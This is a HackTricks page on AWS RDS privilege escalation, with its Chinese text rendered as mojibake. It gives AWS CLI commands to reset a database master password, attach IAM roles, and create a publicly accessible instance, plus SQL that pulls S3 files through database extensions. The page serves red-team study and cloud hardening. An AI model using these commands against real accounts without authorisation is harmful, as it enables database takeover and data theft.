# AWS - RDS Privesc

{% hint style="success" %}
å­¦ä¹ å’Œç»ƒä¹  AWS Hackingï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œç»ƒä¹  GCP Hackingï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡æäº¤ PRs åˆ†äº«é»‘å®¢æŠ€å·§åˆ°** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“ã€‚

</details>
{% endhint %}

## RDS - å…³ç³»æ•°æ®åº“æœåŠ¡

æœ‰å…³ RDS çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../aws-services/aws-relational-database-rds-enum.md" %}
[aws-relational-database-rds-enum.md](../aws-services/aws-relational-database-rds-enum.md)
{% endcontent-ref %}

### `rds:ModifyDBInstance`

æ‹¥æœ‰è¯¥æƒé™çš„æ”»å‡»è€…å¯ä»¥**ä¿®æ”¹ä¸»ç”¨æˆ·çš„å¯†ç **ï¼Œå¹¶ç™»å½•åˆ°æ•°æ®åº“ä¸­ï¼š
```bash
# Get the DB username, db name and address
aws rds describe-db-instances

# Modify the password and wait a couple of minutes
aws rds modify-db-instance \
--db-instance-identifier <db-id> \
--master-user-password 'Llaody2f6.123' \
--apply-immediately

# In case of postgres
psql postgresql://<username>:<pass>@<rds-dns>:5432/<db-name>
```
{% hint style="warning" %}
ä½ éœ€è¦èƒ½å¤Ÿ**è”ç³»æ•°æ®åº“**ï¼ˆå®ƒä»¬é€šå¸¸åªèƒ½ä»å†…éƒ¨ç½‘ç»œè®¿é—®ï¼‰ã€‚
{% endhint %}

**æ½œåœ¨å½±å“ï¼š** åœ¨æ•°æ®åº“ä¸­æŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯ã€‚

### rds-db:connect

æ ¹æ®[**æ–‡æ¡£**](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/UsingWithRDS.IAMDBAuth.IAMPolicy.html)ï¼Œå…·æœ‰æ­¤æƒé™çš„ç”¨æˆ·å¯ä»¥è¿æ¥åˆ°DBå®ä¾‹ã€‚

### æ»¥ç”¨RDSè§’è‰²IAMæƒé™

#### Postgresql (Aurora)

{% hint style="success" %}
å¦‚æœè¿è¡Œ**`SELECT datname FROM pg_database;`**ä½ å‘ç°ä¸€ä¸ªåä¸º**`rdsadmin`**çš„æ•°æ®åº“ï¼Œä½ å°±çŸ¥é“ä½ åœ¨ä¸€ä¸ª**AWS postgresqlæ•°æ®åº“**ä¸­ã€‚
{% endhint %}

é¦–å…ˆï¼Œä½ å¯ä»¥æ£€æŸ¥è¿™ä¸ªæ•°æ®åº“æ˜¯å¦è¢«ç”¨æ¥è®¿é—®ä»»ä½•å…¶ä»–AWSæœåŠ¡ã€‚ä½ å¯ä»¥é€šè¿‡æŸ¥çœ‹å·²å®‰è£…çš„æ‰©å±•æ¥æ£€æŸ¥ï¼š
```sql
SELECT * FROM pg_extension;
```
å¦‚æœä½ å‘ç°ç±»ä¼¼ **`aws_s3`** çš„å†…å®¹ï¼Œä½ å¯ä»¥å‡è®¾è¿™ä¸ªæ•°æ®åº“å¯¹ S3 æœ‰ **æŸç§è®¿é—®æƒé™**ï¼ˆè¿˜æœ‰å…¶ä»–æ‰©å±•ï¼Œå¦‚ **`aws_ml`** å’Œ **`aws_lambda`**ï¼‰ã€‚

æ­¤å¤–ï¼Œå¦‚æœä½ æœ‰æƒé™è¿è¡Œ **`aws rds describe-db-clusters`**ï¼Œä½ å¯ä»¥åœ¨ **`AssociatedRoles`** å­—æ®µä¸­çœ‹åˆ° **é›†ç¾¤æ˜¯å¦é™„åŠ äº†ä»»ä½• IAM è§’è‰²**ã€‚å¦‚æœæœ‰ï¼Œä½ å¯ä»¥å‡è®¾è¯¥æ•°æ®åº“ **å·²å‡†å¤‡å¥½è®¿é—®å…¶ä»– AWS æœåŠ¡**ã€‚åŸºäº **è§’è‰²çš„åç§°**ï¼ˆæˆ–è€…å¦‚æœä½ èƒ½è·å–è§’è‰²çš„ **æƒé™**ï¼‰ï¼Œä½ å¯ä»¥ **çŒœæµ‹** æ•°æ®åº“è¿˜æœ‰å“ªäº›é¢å¤–çš„è®¿é—®æƒé™ã€‚

ç°åœ¨ï¼Œè¦ **è¯»å–æ¡¶å†…çš„æ–‡ä»¶**ï¼Œä½ éœ€è¦çŸ¥é“å®Œæ•´è·¯å¾„ã€‚ä½ å¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤è¯»å–ï¼š
```sql
// Create table
CREATE TABLE ttemp (col TEXT);

// Create s3 uri
SELECT aws_commons.create_s3_uri(
'test1234567890678', // Name of the bucket
'data.csv',          // Name of the file
'eu-west-1'          //region of the bucket
) AS s3_uri \gset

// Load file contents in table
SELECT aws_s3.table_import_from_s3('ttemp', '', '(format text)',:'s3_uri');

// Get info
SELECT * from ttemp;

// Delete table
DROP TABLE ttemp;
```
å¦‚æœä½ æœ‰**åŸå§‹AWSå‡­è¯**ï¼Œä½ ä¹Ÿå¯ä»¥ç”¨å®ƒä»¬æ¥è®¿é—®S3æ•°æ®ï¼š
```sql
SELECT aws_s3.table_import_from_s3(
't', '', '(format csv)',
:'s3_uri',
aws_commons.create_aws_credentials('sample_access_key', 'sample_secret_key', '')
);
```
{% hint style="info" %}
Postgresql **ä¸éœ€è¦æ›´æ”¹ä»»ä½•å‚æ•°ç»„å˜é‡**å³å¯è®¿é—®S3ã€‚
{% endhint %}

#### Mysql (Aurora)

{% hint style="success" %}
åœ¨mysqlä¸­ï¼Œå¦‚æœè¿è¡ŒæŸ¥è¯¢ **`SELECT User, Host FROM mysql.user;`** å¹¶ä¸”æœ‰ä¸€ä¸ªåä¸º **`rdsadmin`** çš„ç”¨æˆ·ï¼Œå¯ä»¥å‡è®¾ä½ åœ¨ä¸€ä¸ª **AWS RDS mysql db** ä¸­ã€‚
{% endhint %}

åœ¨mysqlä¸­è¿è¡Œ **`show variables;`**ï¼Œå¦‚æœå˜é‡å¦‚ **`aws_default_s3_role`**ã€**`aurora_load_from_s3_role`**ã€**`aurora_select_into_s3_role`** æœ‰å€¼ï¼Œå¯ä»¥å‡è®¾æ•°æ®åº“å·²å‡†å¤‡å¥½è®¿é—®S3æ•°æ®ã€‚

æ­¤å¤–ï¼Œå¦‚æœä½ æœ‰æƒé™è¿è¡Œ **`aws rds describe-db-clusters`**ï¼Œä½ å¯ä»¥æ£€æŸ¥é›†ç¾¤æ˜¯å¦æœ‰ä»»ä½• **å…³è”è§’è‰²**ï¼Œè¿™é€šå¸¸æ„å‘³ç€å¯ä»¥è®¿é—®AWSæœåŠ¡ã€‚

ç°åœ¨ï¼Œè¦ **è¯»å–æ¡¶å†…çš„æ–‡ä»¶**ï¼Œä½ éœ€è¦çŸ¥é“å®Œæ•´è·¯å¾„ã€‚ä½ å¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤è¯»å–ï¼š
```sql
CREATE TABLE ttemp (col TEXT);
LOAD DATA FROM S3 's3://mybucket/data.txt' INTO TABLE ttemp(col);
SELECT * FROM ttemp;
DROP TABLE ttemp;
```
### `rds:AddRoleToDBCluster`, `iam:PassRole`

å…·æœ‰ `rds:AddRoleToDBCluster` å’Œ `iam:PassRole` æƒé™çš„æ”»å‡»è€…å¯ä»¥**å°†æŒ‡å®šè§’è‰²æ·»åŠ åˆ°ç°æœ‰ RDS å®ä¾‹**ã€‚è¿™å¯èƒ½å…è®¸æ”»å‡»è€…**è®¿é—®æ•æ„Ÿæ•°æ®**æˆ–ä¿®æ”¹å®ä¾‹ä¸­çš„æ•°æ®ã€‚
```bash
aws add-role-to-db-cluster --db-cluster-identifier <value> --role-arn <value>
```
**æ½œåœ¨å½±å“**: è®¿é—®æ•æ„Ÿæ•°æ®æˆ–æœªç»æˆæƒä¿®æ”¹RDSå®ä¾‹ä¸­çš„æ•°æ®ã€‚\
æ³¨æ„ï¼Œä¸€äº›æ•°æ®åº“éœ€è¦é¢å¤–çš„é…ç½®ï¼Œä¾‹å¦‚Mysqlï¼Œéœ€è¦åœ¨å‚æ•°ç»„ä¸­æŒ‡å®šè§’è‰²ARNã€‚

### `rds:CreateDBInstance`

ä»…å‡­æ­¤æƒé™ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨å·²ç»å­˜åœ¨å¹¶é™„æœ‰**IAMè§’è‰²**çš„é›†ç¾¤å†…åˆ›å»ºä¸€ä¸ª**æ–°å®ä¾‹**ã€‚ä»–æ— æ³•æ›´æ”¹ä¸»ç”¨æˆ·å¯†ç ï¼Œä½†ä»–å¯èƒ½èƒ½å¤Ÿå°†æ–°æ•°æ®åº“å®ä¾‹æš´éœ²ç»™äº’è”ç½‘ï¼š
```bash
aws --region eu-west-1 --profile none-priv rds create-db-instance \
--db-instance-identifier mydbinstance2 \
--db-instance-class db.t3.medium \
--engine aurora-postgresql \
--db-cluster-identifier database-1 \
--db-security-groups "string" \
--publicly-accessible
```
### `rds:CreateDBInstance`, `iam:PassRole`

{% hint style="info" %}
TODO: æµ‹è¯•
{% endhint %}

å…·æœ‰ `rds:CreateDBInstance` å’Œ `iam:PassRole` æƒé™çš„æ”»å‡»è€…å¯ä»¥**åˆ›å»ºä¸€ä¸ªé™„åŠ äº†æŒ‡å®šè§’è‰²çš„æ–° RDS å®ä¾‹**ã€‚æ”»å‡»è€…éšåå¯èƒ½**è®¿é—®æ•æ„Ÿæ•°æ®**æˆ–ä¿®æ”¹å®ä¾‹ä¸­çš„æ•°æ®ã€‚

{% hint style="warning" %}
è¦é™„åŠ çš„è§’è‰²/å®ä¾‹é…ç½®æ–‡ä»¶çš„ä¸€äº›è¦æ±‚ï¼ˆæ¥è‡ª[**è¿™é‡Œ**](https://docs.aws.amazon.com/cli/latest/reference/rds/create-db-instance.html)ï¼‰ï¼š

* é…ç½®æ–‡ä»¶å¿…é¡»å­˜åœ¨äºæ‚¨çš„è´¦æˆ·ä¸­ã€‚
* é…ç½®æ–‡ä»¶å¿…é¡»å…·æœ‰ Amazon EC2 æœ‰æƒé™æ‰¿æ‹…çš„ IAM è§’è‰²ã€‚
* å®ä¾‹é…ç½®æ–‡ä»¶åç§°å’Œå…³è”çš„ IAM è§’è‰²åç§°å¿…é¡»ä»¥å‰ç¼€ `AWSRDSCustom` å¼€å¤´ã€‚
{% endhint %}

{% code overflow="wrap" %}
```bash
aws rds create-db-instance --db-instance-identifier malicious-instance --db-instance-class db.t2.micro --engine mysql --allocated-storage 20 --master-username admin --master-user-password mypassword --db-name mydatabase --vapc-security-group-ids sg-12345678 --db-subnet-group-name mydbsubnetgroup --enable-iam-database-authentication --custom-iam-instance-profile arn:aws:iam::123456789012:role/MyRDSEnabledRole
```
{% endcode %}

**æ½œåœ¨å½±å“**: è®¿é—®æ•æ„Ÿæ•°æ®æˆ–æœªç»æˆæƒä¿®æ”¹RDSå®ä¾‹ä¸­çš„æ•°æ®ã€‚

### `rds:AddRoleToDBInstance`, `iam:PassRole`

å…·æœ‰`rds:AddRoleToDBInstance`å’Œ`iam:PassRole`æƒé™çš„æ”»å‡»è€…å¯ä»¥**å°†æŒ‡å®šè§’è‰²æ·»åŠ åˆ°ç°æœ‰RDSå®ä¾‹**ã€‚è¿™å¯èƒ½å…è®¸æ”»å‡»è€…**è®¿é—®æ•æ„Ÿæ•°æ®**æˆ–ä¿®æ”¹å®ä¾‹ä¸­çš„æ•°æ®ã€‚

{% hint style="warning" %}
DBå®ä¾‹å¿…é¡»åœ¨é›†ç¾¤ä¹‹å¤–
{% endhint %}

{% code overflow="wrap" %}
```bash
aws rds add-role-to-db-instance --db-instance-identifier target-instance --role-arn arn:aws:iam::123456789012:role/MyRDSEnabledRole --feature-name <feat-name>
```
{% endcode %}

**æ½œåœ¨å½±å“**: è®¿é—®æ•æ„Ÿæ•°æ®æˆ–å¯¹RDSå®ä¾‹ä¸­çš„æ•°æ®è¿›è¡Œæœªç»æˆæƒçš„ä¿®æ”¹ã€‚

{% hint style="success" %}
å­¦ä¹ å’Œç»ƒä¹ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œç»ƒä¹ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ä¸Š**å…³æ³¨**æˆ‘ä»¬ã€‚
* **é€šè¿‡æäº¤PRsåˆ°** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æ¥åˆ†äº«é»‘å®¢æŠ€å·§**ã€‚

</details>
{% endhint %}
